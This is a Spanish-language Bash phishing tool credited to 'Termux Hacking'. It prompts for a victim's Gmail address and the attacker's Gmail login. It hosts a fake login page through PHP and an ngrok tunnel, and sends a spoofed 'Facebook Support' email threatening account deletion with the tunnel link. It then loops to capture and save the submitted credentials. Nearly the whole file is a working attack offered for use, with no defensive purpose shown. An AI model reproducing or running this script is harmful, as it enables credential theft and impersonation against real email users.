#!/bin/bash
#
# Created by: Termux Hacking
#
# EmailSpoofing
#
# VARIABLES
#
source $HOME/Falsify/Colors.sh
#
# FUNCIONES
#
trap 'printf "\n";stop;exit 1' 2
function EmailSpoofing {
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DE SU VÍCTIMA ${rojo}(Gmail) ${verde}█
└═════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Victima
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════┐
█ ${blanco}INGRESE EL NOMBRE DE SU VÍCTIMA ${verde}█
└═════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Nombre_Victima
sleep 0.5
echo -e -n "${verde}
┌════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DEL ATACANTE ${rojo}(Gmail) ${verde}█
└════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Atacante
sleep 0.5
echo -e -n "${verde}
┌═══════════════════════════════════════════┐
█ ${blanco}INGRESE LA CONTRASEÑA DEL CORREO ATACANTE ${verde}█
└═══════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Clave_Atacante
sleep 0.5
echo -e ""
Plantilla="Falsify"
start1
}
stop() {
VERIFICAR_NGROK=$(ps aux | grep -o "ngrok" | head -n1)
VERIFICAR_PHP=$(ps aux | grep -o "php" | head -n1)
VERIFICAR_SSH=$(ps aux | grep -o "ssh" | head -n1)
if [[ $VERIFICAR_NGROK == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $VERIFICAR_PHP == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $VERIFICAR_SSH == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

CREDENCIALES() {

usuario=$(grep -o 'Account:.*' Templates/$Plantilla/usernames.txt | cut -d " " -f2)


clave=$(grep -o 'Pass:.*' Templates/$Plantilla/usernames.txt | cut -d ":" -f2)

echo -e "${verde}
┌════════════════════┐
█ ${blanco}Correo Electrónico ${verde}█
└════════════════════┘
┃
└═>>>${blanco} $usuario"
echo -e "${verde}
┌════════════┐
█ ${blanco}Contraseña ${verde}█
└════════════┘
┃
└═>>>${blanco}$clave"

cat Templates/$Plantilla/usernames.txt >> Templates/$Plantilla/saved.usernames.txt

echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}Esperando Credenciales... ${verde}█
└═══════════════════════════┘"${blanco}
}

touch Templates/$Plantilla/saved.usernames.txt

start() {

if [[ -e Templates/$Plantilla/usernames.txt ]]; then
rm -rf Templates/$Plantilla/usernames.txt
fi

echo -e "${verde}┌══════════════════════════════┐
█ ${blanco}Generando Enlace Phishing... ${verde}█
└══════════════════════════════┘"${blanco}
cd Templates/$Plantilla && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
Enlace=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

echo -e "${verde}┃
└═>>>${blanco} $Enlace"

VERIFICAR_CREDENCIALES
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

start
}

VERIFICAR_CREDENCIALES() {
echo -e "From: 'Facebook Support' <${Correo_Atacante}>
To: '${Nombre_Victima}' <${Correo_Victima}>
Subject: Alerta de Eliminación de su Cuenta de Facebook

FACEBOOK

Su cuenta de Facebook ha sido programada
para ser eliminada definitivamente dentro
de 30 días aproximadamente a partir de
éste momento.
Si usted programo la eliminación de su
cuenta de Facebook, ignore éste mensaje,
de lo contrario, es necesario verificar
la cuenta desde el siguiente enlace de
verificación:
┌════════════════════┐
█ ${Enlace} █
└════════════════════┘
En caso de no verificar su cuenta de
Facebook, ésta será eliminada dentro
de 30 días a partir de éste momento.

              Facebook 2020 ©" >> EmailSpoofing.txt

echo -e "${verde}
┌═════════════════════┐
█ ${blanco}ENVIANDO MENSAJE... ${verde}█
└═════════════════════┘
"${blanco}
curl -n --ssl-reqd --mail-from "FACEBOOK" --mail-rcpt "${Correo_Victima}" --url smtps://smtp.gmail.com:465 -u "${Correo_Atacante}:${Clave_Atacante}" -T EmailSpoofing.txt

echo -e "${verde}
┌═════════════════┐
█ ${blanco}MENSAJE ENVIADO ${verde}█
└═════════════════┘"
rm EmailSpoofing.txt

echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}Esperando Credenciales... ${verde}█
└═══════════════════════════┘"${blanco}
while [ true ]; do
if [[ -e "Templates/$Plantilla/usernames.txt" ]]; then
echo -e "${verde}
┌════════════════════════════┐
█ ${blanco}CREDENCIALES CAPTURADAS... ${verde}█
└════════════════════════════┘"${blanco}
CREDENCIALES
rm -rf Templates/$Plantilla/usernames.txt
fi
sleep 0.5

done
}
EmailSpoofing
